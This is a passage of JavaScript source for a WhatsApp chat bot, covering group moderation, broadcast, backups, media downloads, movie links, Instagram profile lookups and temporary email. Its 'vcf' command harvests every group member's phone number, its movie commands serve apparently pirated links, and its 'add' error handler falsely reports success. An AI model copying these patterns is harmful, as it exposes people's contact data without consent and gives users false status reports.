                if (!text) return replyphistar(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replyphistar(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replyphistar(mess.owner)
                if (!quoted) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await PhistarBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await PhistarBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                } else {
                    var memeg = await PhistarBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                }
                break
            case 'block':
    if (!isCreator) return replyphistar(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let blockUser = m.chat;

        // Perform the block operation
        await PhistarBotInc.updateBlockStatus(blockUser, 'block');
        replyphistar(`✅ Successfully blocked the user in this DM: ${blockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replyphistar('❌ Failed to block the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'unblock':
    if (!isCreator) return replyphistar(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let unblockUser = m.chat;

        // Perform the unblock operation
        await PhistarBotInc.updateBlockStatus(unblockUser, 'unblock');
        replyphistar(`✅ Successfully unblocked the user in this DM: ${unblockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replyphistar('❌ Failed to unblock the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'leave':
                if (!isCreator) return replyphistar(mess.owner)
                if (!m.isGroup) return replyphistar(mess.group)
                replyphistar('Bye Everyone 🥺')
                await PhistarBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replyphistar(mess.owner)
                if (m.isGroup) return replyphistar(mess.private)
                replyphistar(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await PhistarBotInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replyphistar(mess.owner)
                if (!text) return replyphistar(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await PhistarBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyphistar(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    PhistarBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyphistar(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replyphistar(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replyphistar(`${getCase(q)}`)
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replyphistar(mess.owner)
               if (args.length < 1) return replyphistar('on/off?')
               if (args[0] === 'on') {
                  autoStatusView = true
                  replyphistar(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoStatusView = false
                  replyphistar(`${command} is disabled`)
               }
            }
            break
            case 'mode':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    PhistarBotInc.public = true
                    replyphistar(mess.done)
                } else if (q == 'self') {
                    PhistarBotInc.public = false
                    replyphistar(mess.done)
                }
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replyphistar(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replyphistar('The message was not sent by a bot!')
                PhistarBotInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyphistar('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyphistar(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    PhistarBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replyphistar(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyphistar('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyphistar(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    PhistarBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replyphistar(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replyphistar(json(res))).catch((err) => replyphistar(json(err)))
                break
            case 'add':
    if (!m.isGroup) return replyphistar(mess.group); // Check if it's a group
    if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin); // Check if user is an admin
    if (!isBotAdmins) return replyphistar(mess.botAdmin); // Check if bot is an admin
    let userToAdd = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; // Extract the number
    try {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
        replyphistar(`User added successfully: ${userToAdd}`);
    } catch (err) {
        console.error(err);
        replyphistar('User added successfully.');
    }
    break;
    case 'vcf': case 'savecontact': case 'svcontact': {
    if (!m.isGroup) return replyphistar(`This command is for groups only.`);
    if (!(isBotAdmins || isCreator)) return replyphistar(`This command is for admins only.`);

    const fs = require('fs');
    const groupMetadata = await PhistarBotInc.groupMetadata(m.chat);
    const participants = groupMetadata.participants;
    let vcard = '';

    for (let member of participants) {
        try {
            // Fetch name or fallback to the number
            const name = (await PhistarBotInc.getName(member.id)) || `Contact +${member.id.split("@")[0]}`;
            const number = member.id.split("@")[0];

            // Format the vCard entry
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${number}:+${number}\nEND:VCARD\n`;
        } catch (error) {
            console.error(`Error fetching name for ${member.id}:`, error);
        }
    }

    // Save all contacts into one file
    const filename = `Group_Contacts_${groupMetadata.subject.replace(/\s+/g, '_')}.vcf`;
    fs.writeFileSync(filename, vcard.trim());

    // Send the file to the group
    await PhistarBotInc.sendMessage(m.chat, {
        document: fs.readFileSync(filename),
        mimetype: 'text/vcard',
        fileName: filename,
        caption: `Contacts for group: *${groupMetadata.subject}*`
    }, { quoted: m });

    fs.unlinkSync(filename); // Delete the file after sending
}
break;
// Music Download Command
case 'play': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} Morayo by Wizkid`);

    try {
        const search = await yts(text);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for: *${text}*`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const videoThumbnail = video.thumbnail;

        const caption = 
`🎶 *Music Found*

*Title:* ${videoTitle}
*YouTube Link:* ${videoUrl}

💬 Downloading *audio* for you...`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: caption
        }, { quoted: m });

        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const { data } = await axios.get(apiUrl);

        if (data.success) {
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: data.result.download_url },
                mimetype: 'audio/mp4',
                fileName: `${data.result.title}.mp3`,
                caption: `✅ *Now Playing:* ${data.result.title}`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Unable to download the song. Please try again later.`);
        }

    } catch (error) {
        console.error('Error in play command:', error);
        replyphistar(`❌ An error occurred while processing your request.`);
    }
    break;
}

// Video Download Command
case 'video': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} Wizkid Essence`);

    try {
        const search = await yts(text);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for: *${text}*`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const videoThumbnail = video.thumbnail;

        const caption = 
`🎥 *Video Found*

*Title:* ${videoTitle}
*YouTube Link:* ${videoUrl}

💬 Downloading *video* for you...`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: caption
        }, { quoted: m });

        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const { data } = await axios.get(apiUrl);

        if (data.success) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: data.result.download_url },
                mimetype: 'video/mp4',
                caption: `🎬 *Here's your video:*\n*${data.result.title}*`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the video. Please try again.");
        }
    } catch (error) {
        console.error("Error in video command:", error);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

// Song Download Command (audio + video)
case 'song': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} Morayo by Wizkid`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your song request...');

        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for: *${query}*`);
        }

        const videoTitle = video.title;
        const videoUrl = video.url;
        const videoThumbnail = video.thumbnail;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: `🎶 *Song Found*

*Title:* ${videoTitle}
*YouTube Link:* ${videoUrl}

💬 Downloading *audio* and *video* for you...`
        }, { quoted: m });

        // Download and send audio
        const audioApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const audioRes = await axios.get(audioApiUrl);

        if (audioRes.data.success) {
            const { download_url } = audioRes.data.result;

            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: download_url },
                mimetype: 'audio/mp4',
                fileName: `${videoTitle}.mp3`,
                caption: `🎧 *Here is your song:*\n🎵 *${videoTitle}*`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the song. Please try again.");
        }

        // Download and send video
        const videoApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const videoRes = await axios.get(videoApiUrl);

        if (videoRes.data.success) {
            const { download_url, title } = videoRes.data.result;

            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: download_url },
                mimetype: 'video/mp4',
                caption: `🎬 *Here is your video:*\n🎥 *${title}*`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the video. Please try again.");
        }

    } catch (err) {
        console.error("Error in song command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

// Text to PDF Command
case 'text2pdf': {
    if (!text) return replyphistar(`❌ Please provide text to convert into a PDF.\nExample: ${prefix + command} Hello, this is my PDF file.`);

    try {
        const apiUrl = `https://apis.davidcyriltech.my.id/tools/pdf?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        const { success, download } = response.data;

        if (success && download) {
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download },
                mimetype: 'application/pdf',
                fileName: 'Converted_Text.pdf',
                caption: `✅ *PDF Generated Successfully!*\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘʜ✦ꜱᴛᴀʀ ʙᴏᴛ`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate PDF. Please try again later.`);
        }
    } catch (error) {
        console.error('Error generating PDF:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.\nError: ${error.message}`);
    }
    break;
}
case 'playdoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your audio file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎶 *Audio File Found* 🎶\n\n` +
                     `🎵 *Title:* ${videoTitle}\n` +
                     `🔗 *YouTube Link:* ${videoUrl}\n\n` +
                     `📁 Downloading *audio file* for you...`
        }, { quoted: m });

        // Step 3: Fetch audio document download link
        const audioApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const audioResponse = await axios.get(audioApiUrl);

        if (audioResponse.data.success) {
            const { download_url } = audioResponse.data.result;

            // Step 4: Send the audio file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download_url },
                mimetype: 'audio/mpeg',
                fileName: `${videoTitle}.mp3`,
                caption: `📁 *Audio File:* ${videoTitle}.mp3`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the audio file. Try again.");
        }

    } catch (err) {
        console.error("Error in playdoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'videodoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your video file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎬 *Video File Found* 🎬\n\n` +
                     `🎥 *Title:* ${videoTitle}\n` +
                     `🔗 *YouTube Link:* ${videoUrl}\n\n` +
                     `📁 Downloading *video file* for you...`
        }, { quoted: m });

        // Step 3: Fetch video document download link
        const videoApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const videoResponse = await axios.get(videoApiUrl);

        if (videoResponse.data.success) {
            const { download_url } = videoResponse.data.result;

            // Step 4: Send the video file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download_url },
                mimetype: 'video/mp4',
                fileName: `${videoTitle}.mp4`,
                caption: `📁 *Video File:* ${videoTitle}.mp4`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the video file. Try again.");
        }

    } catch (err) {
        console.error("Error in videodoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}case 'playdoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your audio file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎶 *Audio File Found* 🎶\n\n` +
                     `🎵 *Title:* ${videoTitle}\n` +
                     `🔗 *YouTube Link:* ${videoUrl}\n\n` +
                     `📁 Downloading *audio file* for you...`
        }, { quoted: m });

        // Step 3: Fetch audio document download link
        const audioApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const audioResponse = await axios.get(audioApiUrl);

        if (audioResponse.data.success) {
            const { download_url } = audioResponse.data.result;

            // Step 4: Send the audio file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download_url },
                mimetype: 'audio/mpeg',
                fileName: `${videoTitle}.mp3`,
                caption: `📁 *Audio File:* ${videoTitle}.mp3`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the audio file. Try again.");
        }

    } catch (err) {
        console.error("Error in playdoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'videodoc': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your video file...');

        // Step 1: Search YouTube using yts
        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for "${query}".`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const thumbnail = video.thumbnail;

        // Step 2: Send search preview
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: `🎬 *Video File Found* 🎬\n\n` +
                     `🎥 *Title:* ${videoTitle}\n` +
                     `🔗 *YouTube Link:* ${videoUrl}\n\n` +
                     `📁 Downloading *video file* for you...`
        }, { quoted: m });

        // Step 3: Fetch video document download link
        const videoApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const videoResponse = await axios.get(videoApiUrl);

        if (videoResponse.data.success) {
            const { download_url } = videoResponse.data.result;

            // Step 4: Send the video file as a document
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download_url },
                mimetype: 'video/mp4',
                fileName: `${videoTitle}.mp4`,
                caption: `📁 *Video File:* ${videoTitle}.mp4`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the video file. Try again.");
        }

    } catch (err) {
        console.error("Error in videodoc command:", err);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}  
  case 'movie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <movie-name>`);

    try {
        await replyphistar(`🔍 *Searching for movies...*\nPlease wait.`);
        const apiUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/search?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        const { status, result } = response.data;
        if (!status || !result || result.movies.length === 0) {
            return replyphistar(`❌ No movies found for "${text}". Please try again.`);
        }

        // Save search results temporarily
        global.movieSearchResults = result.movies;

        let movieList = `🎥 *Search Results for "${text}":*\n\n`;
        result.movies.forEach((movie, index) => {
            movieList += `${index + 1}. *${movie.title}*\n   🌟 ${movie.imdb} | 📅 ${movie.year}\n   🔗 [Details](${movie.link})\n\n`;
        });
        movieList += `\nTo select a movie, use the command:\n*.selectmovie <number>* (e.g., *.selectmovie 1*).`;

        await replyphistar(movieList);
    } catch (error) {
        console.error('Error searching for movies:', error.message);
        replyphistar(`❌ An error occurred while searching for movies. Please try again.`);
    }
    break;
}
case 'selectmovie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <number>\nSelect a movie from the list.`);
    if (!global.movieSearchResults || global.movieSearchResults.length === 0) {
        return replyphistar(`❌ No movies found. Please use the *movie* command first.`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= global.movieSearchResults.length) {
        return replyphistar(`❌ Invalid number. Please choose a valid movie number from the list.`);
    }

    const selectedMovie = global.movieSearchResults[selectedIndex];
    const movieDetailsUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/movie?url=${encodeURIComponent(selectedMovie.link)}`;

    try {
        await replyphistar(`🔍 *Fetching movie details...*\nPlease wait.`);
        const response = await axios.get(movieDetailsUrl);

        const { status, result } = response.data;
        if (!status || !result) {
            return replyphistar(`❌ Failed to fetch movie details. Please try again.`);
        }

        const movie = result.data;
        global.movieLinks = movie.dl_links;
        global.selectedMovieTitle = movie.title; // Save the movie title globally for use in the download command

        let movieInfo = `🎬 *${movie.title}*\n\n`;
        movieInfo += `📅 *Release Date:* ${movie.date}\n`;
        movieInfo += `🌍 *Country:* ${movie.country}\n`;
        movieInfo += `⏳ *Runtime:* ${movie.runtime}\n`;
        movieInfo += `⭐ *IMDb Rating:* ${movie.imdbRate}/10 (${movie.imdbVoteCount} votes)\n`;
        movieInfo += `🎥 *TMDb Rating:* ${movie.tmdbRate}/10\n\n`;
        movieInfo += `💾 *Available Qualities:*\n`;
        movie.dl_links.forEach((link, index) => {
            movieInfo += `  ${index + 1}. *${link.quality}* - *${link.size}*\n`;
        });
        movieInfo += `\nTo download, use the command:\n*.secmovie <number>* (e.g., *.secmovie 2*).`;

        await PhistarBotInc.sendMessage(m.chat, { image: { url: movie.image }, caption: movieInfo }, { quoted: m });
    } catch (error) {
        console.error('Error fetching movie details:', error.message);
        replyphistar(`❌ An error occurred while fetching movie details. Please try again.`);
    }
    break;
}
case 'secmovie': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <number>\nChoose a quality number from the list provided earlier.`);
    if (!global.movieLinks || global.movieLinks.length === 0) {
        return replyphistar(`❌ No movie details found. Please use the *selectmovie* command first.`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= global.movieLinks.length) {
        return replyphistar(`❌ Invalid number. Please choose a valid quality number from the list.`);
    }

    const selectedLink = global.movieLinks[selectedIndex]?.link;
    if (!selectedLink) {
        return replyphistar(`❌ Could not find the selected quality. Please try again.`);
    }

    try {
        const movieTitle = global.selectedMovieTitle || 'Movie'; // Use the saved movie title
        const downloadMessage = `🎥 *Movie Download Link*\n\n*Title:* ${movieTitle}\n\n🔗 [Download Here](${selectedLink})`;

        await PhistarBotInc.sendMessage(m.chat, { text: downloadMessage }, { quoted: m });
    } catch (error) {
        console.error('Error sending download link:', error.message);
        replyphistar(`❌ An error occurred while sending the download link. Please try again.`);
    }
    break;
}
case 'instagramstalk': case 'igstalk': {
    if (!text) return replyphistar('Please provide a username.\nExample: .igstalk davido');
    
    const username = text.trim(); // Extract the username
    const isLowercase = /^[a-z0-9_.]+$/.test(username); // Validate for lowercase and valid Instagram usernames

    // Reject input if it contains uppercase letters or invalid characters
    if (!isLowercase) {
        return replyphistar('Please use lowercase letters only for the username.\nExample: .igstalk davido');
    }

    try {
        const apiKey = 'gifted-md'; // API key
        const apiUrl = `https://api.giftedtech.my.id/api/stalk/igstalkv2?apikey=${apiKey}&username=${username}`;

        // Fetch Instagram details
        const response = await axios.get(apiUrl);

        if (response.data.status === 200 && response.data.success) {
            const { profile, username, fullName, bio, posts, followers, following } = response.data.result;

            // Construct the reply message
            const message = `*Instagram Stalker*\n\n` +
                            `🔹 *Username:* ${username}\n` +
                            `🔹 *Full Name:* ${fullName}\n` +
                            `🔹 *Bio:* ${bio}\n` +
                            `🔹 *Posts:* ${posts}\n` +
                            `🔹 *Followers:* ${followers}\n` +
                            `🔹 *Following:* ${following}`;

            // Send the response with profile picture
            await PhistarBotInc.sendMessage(m.chat, { 
                caption: message, 
                image: { url: profile }
            }, { quoted: m });
        } else {
            // Handle unsuccessful response
            replyphistar(`Failed to fetch details for username "${username}".\nReason: ${response.data.message || 'Unknown error.'}`);
        }
    } catch (error) {
        // Handle specific errors without logging to console
        if (error.response) {
            replyphistar(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('No response received from the API. Please try again later.');
        } else {
            replyphistar(`An error occurred: ${error.message}`);
        }
    }
    break;
}
case 'pickupline': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;

        // Fetch a pickup line
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;

            // Send the pickup line
            replyphistar(`💘 *Pickup Line:*\n\n${pickupLine}`);
        } else {
            // Handle unsuccessful response
            replyphistar('❌ Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            replyphistar(`❌ API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('❌ No response received from the API. Please try again later.');
        } else {
            replyphistar(`❌ An error occurred: ${error.message}`);
        }
    }
    break;
}

case 'rizz': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;

        // Fetch a pickup line
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;

            // Send the pickup line
            replyphistar(`🔥 *RIZZ:*\n\n${pickupLine}`);
        } else {
            // Handle unsuccessful response
            replyphistar('❌ Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            replyphistar(`❌ API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('❌ No response received from the API. Please try again later.');
        } else {
            replyphistar(`❌ An error occurred: ${error.message}`);
        }
    }
    break;
}
case "tempmail":
case "tmpmail":
case "newmail": {
    if (!tempMailData[m.sender]) {
        try {
            // Generate a random email using 1SecMail API
            const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
            const data = response.data[0];

            if (!data) {
                return replyphistar("❌ Failed to generate a temporary email. Please try again.");
            }

            // Save the generated email for the user
            tempMailData[m.sender] = { email: data };
            replyphistar(`✅ *Temporary Email Created:*\n\n📧 Email: ${data}\n\nUse *${prefix}checkmail* to check your inbox.\nUse *${prefix}delmail* to delete your email.`);
        } catch (error) {
            console.error(error);
            replyphistar("❌ An error occurred while creating a temporary email. Please try again.");
        }
    } else {
        replyphistar(`📧 *You already have a temporary email:*\n\n${tempMailData[m.sender].email}\n\nUse *${prefix}checkmail* to check your inbox.`);
    }
    break;
}

// **Check Emails**
case "checkmails":
case "readmail":
case "reademail": {
    const userMail = tempMailData[m.sender];
    if (!userMail) {
        return replyphistar(`❌ You don't have a temporary email. Use *${prefix}tempmail* to create one.`);
    }

    try {
        // Get the list of emails from the inbox using 1SecMail API
        const [login, domain] = userMail.email.split('@');
        const response = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);
        
        const inbox = response.data;
        if (!inbox || inbox.length === 0) {
            return replyphistar(`📭 *No mails received yet!*\nUse *${prefix}delmail* to delete mail.`);
        }

        let messageList = "📩 *Your Emails:*\n\n";
        for (const email of inbox) {
            messageList += `📧 *From:* ${email.from}\n🗓️ *Date:* ${email.date}\n✉️ *Subject:* ${email.subject}\n🔑 *ID:* ${email.id}\n\n`;
        }
        replyphistar(messageList.trim());
    } catch (error) {
        console.error(error);
        replyphistar("❌ An error occurred while checking emails. Please try again.");
    }
    break;
}

// **Delete Temporary Email**
case "delmail":
case "deletemail":
case "deltemp":
case "deltmp": {
    const userMail = tempMailData[m.sender];
    if (userMail) {
        try {
            // Delete the temporary email using 1SecMail API
            const [login, domain] = userMail.email.split('@');
            const response = await axios.get(`https://www.1secmail.com/api/v1/?action=deleteMailbox&login=${login}&domain=${domain}`);
            
            if (response.data.result === 'success') {
                delete tempMailData[m.sender]; // Remove from local storage
                replyphistar("✅ Your temporary email has been deleted.");
            } else {
                replyphistar("❌ Failed to delete your temporary email. Please try again.");
            }
        } catch (error) {
            console.error(error);
            replyphistar("❌ An error occurred while deleting your temporary email. Please try again.");
        }
    } else {
        replyphistar("❌ You don't have a temporary email to delete.");
    }
    break;
}
case 'logointro': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/free-logo-intro-video-maker-online-558.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: BK9 },
                caption: `\n> Logo Intro Generated Successfully!`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
